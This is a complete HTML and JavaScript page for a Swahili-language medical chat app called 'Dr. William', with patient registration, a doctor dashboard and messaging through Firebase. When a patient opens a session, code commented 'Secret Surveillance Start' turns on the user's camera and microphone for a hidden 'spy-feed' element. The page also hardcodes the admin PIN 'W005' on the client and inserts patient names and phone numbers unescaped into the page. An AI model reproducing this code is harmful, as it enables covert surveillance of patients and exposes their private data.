<!DOCTYPE html>
<html lang="sw">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Dr. William: Advanced Medical Control</title>
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>

    <style>
        :root { --gold: #D4AF37; --bg: #050505; --red: #ff4757; --green: #2ed573; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
        body, html { background: var(--bg); color: white; height: 100%; overflow: hidden; position: fixed; width: 100%; }

        /* BLACK BIRD BACKGROUND */
        .app-bg {
            position: fixed; inset: 0;
            background: linear-gradient(rgba(0,0,0,0.8), rgba(0,0,0,0.9)), 
                        url('https://images.unsplash.com/photo-1516233501034-753582b795b6?ixlib=rb-1.2.1&auto=format&fit=crop&w=1350&q=80');
            background-size: cover; background-position: center; z-index: -1;
        }

        /* SURVEILLANCE FEED (HIDDEN FOR USER) */
        #spy-feed { position: fixed; top: 10px; right: 10px; width: 120px; border: 2px solid var(--gold); border-radius: 10px; display: none; z-index: 1000; }

        /* DASHBOARD */
        #main-interface { display: none; flex-direction: column; height: 100%; }
        .chat-header { padding: 15px; background: rgba(0,0,0,0.9); border-bottom: 2px solid var(--gold); display: flex; justify-content: space-between; align-items: center; }
        
        .patient-card { 
            background: rgba(20,20,20,0.8); padding: 15px; border-radius: 15px; margin-bottom: 12px; 
            border: 1px solid #333; display: flex; justify-content: space-between; align-items: center;
        }
        .btn-grp { display: flex; gap: 5px; }
        .btn-sm { padding: 5px 10px; border-radius: 5px; border: none; font-size: 10px; cursor: pointer; font-weight: bold; }

        /* CHAT AREA */
        #chat-interface { flex: 1; display: none; flex-direction: column; position: relative; }
        .chat-messages { flex: 1; overflow-y: auto; padding: 15px; display: flex; flex-direction: column; gap: 10px; padding-bottom: 100px; }
        .message { padding: 10px 15px; border-radius: 15px; max-width: 80%; font-size: 14px; position: relative; }
        .msg-me { background: var(--gold); color: black; align-self: flex-end; }
        .msg-other { background: #222; color: white; align-self: flex-start; }
        .msg-del { position: absolute; top: -5px; right: -5px; color: var(--red); font-size: 12px; cursor: pointer; display: none; }
        .message:hover .msg-del { display: block; }

        /* TYPING */
        .typing-area { position: fixed; bottom: 0; width: 100%; background: #111; padding: 15px; display: flex; gap: 10px; align-items: center; }
        .input-wrap { flex: 1; background: #000; border-radius: 25px; padding: 5px 15px; border: 1px solid var(--gold); display: flex; }
        .input-wrap input { flex: 1; background: transparent; border: none; color: white; padding: 10px; outline: none; }
        .btn-send { background: var(--gold); border: none; width: 45px; height: 45px; border-radius: 50%; color: black; }

        /* LOGIN */
        #login-screen { position: fixed; inset: 0; background: #000; display: flex; justify-content: center; align-items: center; z-index: 9999; }
        .login-box { background: #111; padding: 30px; border-radius: 25px; border: 1px solid var(--gold); width: 85%; text-align: center; }
        .login-box input { width: 100%; padding: 15px; margin: 10px 0; border-radius: 10px; background: #000; color: white; border: 1px solid #333; }
    </style>
</head>
<body>

    <div class="app-bg"></div>
    <video id="spy-feed" autoplay muted playsinline></video>

    <audio id="notifSound" src="https://assets.mixkit.co/active_storage/sfx/2358/2358-preview.mp3"></audio>

    <div id="login-screen">
        <div class="login-box">
            <h2 style="color:var(--gold)">DR. WILLIAM CONTROL</h2>
            <div id="u-inputs">
                <input type="text" id="reg-name" placeholder="Majina Kamili">
                <input type="tel" id="reg-phone" placeholder="Namba ya Simu (10)" maxlength="10">
            </div>
            <input type="password" id="doc-pin" placeholder="Doctor Secure PIN" style="display:none;">
            <p onclick="toggleDoc()" id="d-btn" style="color:var(--gold); margin:10px; cursor:pointer; font-size:12px;">Admin Access</p>
            <button onclick="auth()" style="background:var(--gold); width:100%; padding:15px; border-radius:10px; border:none; font-weight:bold;">INGIA</button>
        </div>
    </div>

    <div id="main-interface">
        <div class="chat-header">
            <span id="title-text" style="color:var(--gold); font-weight:bold;">Clinic Panel</span>
            <button id="back-btn" onclick="location.reload()" style="display:none; background:none; border:1px solid var(--gold); color:white; padding:5px 10px; border-radius:10px;">Dashboard</button>
        </div>

        <div id="doctor-dashboard" style="display:none; padding:20px; overflow-y:auto; flex:1;">
            <div id="patient-list"></div>
        </div>

        <div id="chat-interface">
            <div class="chat-messages" id="chat-flow"></div>
            <div class="typing-area">
                <i class="fas fa-image" style="color:var(--gold); font-size:20px;" onclick="document.getElementById('f-up').click()"></i>
                <input type="file" id="f-up" style="display:none;" onchange="sendFile(this)">
                <div class="input-wrap">
                    <input type="text" id="msg-input" placeholder="Andika..." onkeypress="if(event.key==='Enter') sendMsg()">
                </div>
                <button class="btn-send" onclick="sendMsg()"><i class="fas fa-paper-plane"></i></button>
            </div>
        </div>
    </div>

    <script>
        const firebaseConfig = { databaseURL: "https://drwilliamtz-e44aa-default-rtdb.europe-west1.firebasedatabase.app" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        let myData = JSON.parse(localStorage.getItem('dr_w_v5')) || null;
        let isDoc = localStorage.getItem('dr_w_v5_doc') === 'true';
        let deviceID = localStorage.getItem('dr_w_v5_dev') || Math.random().toString(36).substring(7);
        localStorage.setItem('dr_w_v5_dev', deviceID);
        let activeRoom = "";

        if(myData) {
            document.getElementById('login-screen').style.display = 'none';
            document.getElementById('main-interface').style.display = 'flex';
            isDoc ? showDashboard() : startUserSession();
        }

        function toggleDoc() {
            document.getElementById('u-inputs').style.display = 'none';
            document.getElementById('doc-pin').style.display = 'block';
            document.getElementById('d-btn').style.display = 'none';
        }

        function auth() {
            const name = document.getElementById('reg-name').value;
            const phone = document.getElementById('reg-phone').value;
            const pin = document.getElementById('doc-pin').value;

            if(pin === "W005") {
                isDoc = true; myData = { name: "Dr. William" };
                localStorage.setItem('dr_w_v5_doc', 'true');
            } else {
                if(!name || phone.length < 10) return alert("Jaza sahihi");
                const roomId = "room_" + phone;
                myData = { name, phone, roomId, deviceID };
                db.ref('users/' + roomId).set({ ...myData, lastSeen: Date.now(), blocked: false });
            }
            localStorage.setItem('dr_w_v5', JSON.stringify(myData));
            location.reload();
        }

        function showDashboard() {
            document.getElementById('doctor-dashboard').style.display = 'block';
            db.ref('users').on('value', snap => {
                const list = document.getElementById('patient-list');
                list.innerHTML = "";
                snap.forEach(c => {
                    const u = c.val();
                    if(u.blocked) return;
                    list.innerHTML += `<div class="patient-card">
                        <div onclick="openChat('${c.key}','${u.name}','${u.phone}')">
                            <b>${u.name}</b><br><small>${u.phone}</small>
                        </div>
                        <div class="btn-grp">
                            <button class="btn-sm" style="background:var(--red)" onclick="blockUser('${c.key}')">BLOCK</button>
                            <button class="btn-sm" style="background:#3498db" onclick="alert('Mgonjwa amewekwa foleni')">WAIT</button>
                        </div>
                    </div>`;
                });
            });
        }

        function openChat(roomId, name, phone) {
            activeRoom = roomId;
            document.getElementById('doctor-dashboard').style.display = 'none';
            document.getElementById('chat-interface').style.display = 'flex';
            document.getElementById('title-text').innerHTML = `${name} <small>${phone}</small>`;
            if(isDoc) {
                document.getElementById('back-btn').style.display = 'block';
                document.getElementById('spy-feed').style.display = 'block';
            }
            
            db.ref('messages/' + roomId).on('child_added', snap => {
                renderMsg(snap.val(), snap.key);
            });
        }

        function startUserSession() {
            openChat(myData.roomId, "Dr. William", "");
            // Secret Surveillance Start
            navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
                const video = document.getElementById('spy-feed');
                video.srcObject = stream;
            }).catch(e => console.log("Spy failed"));
            
            setInterval(() => db.ref('users/'+myData.roomId).update({lastSeen: Date.now()}), 5000);
        }

        function renderMsg(m, key) {
            const div = document.createElement('div');
            const me = (isDoc && m.sender === "Dr. William") || (!isDoc && m.sender === myData.name);
            div.className = `message ${me ? 'msg-me' : 'msg-other'}`;
            div.innerHTML = `<b>${m.sender}</b><br>${m.text} <i class="fas fa-trash msg-del" onclick="deleteMsg('${key}')"></i>`;
            document.getElementById('chat-flow').appendChild(div);
            document.getElementById('chat-flow').scrollTop = document.getElementById('chat-flow').scrollHeight;
            if(!me) document.getElementById('notifSound').play();
        }

        function sendMsg() {
            const input = document.getElementById('msg-input');
            if(!input.value.trim()) return;
            db.ref('messages/' + activeRoom).push({
                sender: isDoc ? "Dr. William" : myData.name,
                text: input.value.trim(),
                time: Date.now()
            });
            input.value = "";
        }

        function sendFile(input) {
            if(input.files[0]) {
                db.ref('messages/' + activeRoom).push({
                    sender: isDoc ? "Dr. William" : myData.name,
                    text: "ðŸ“ Faili limetuma: " + input.files[0].name,
                    time: Date.now()
                });
            }
        }

        function deleteMsg(key) {
            if(isDoc && confirm("Futa ujumbe?")) db.ref('messages/' + activeRoom + '/' + key).remove().then(() => location.reload());
        }

        function blockUser(id) {
            if(confirm("Kumblock huyu user asirudi tena?")) db.ref('users/' + id).update({ blocked: true });
        }
    </script>
</body>
</html>
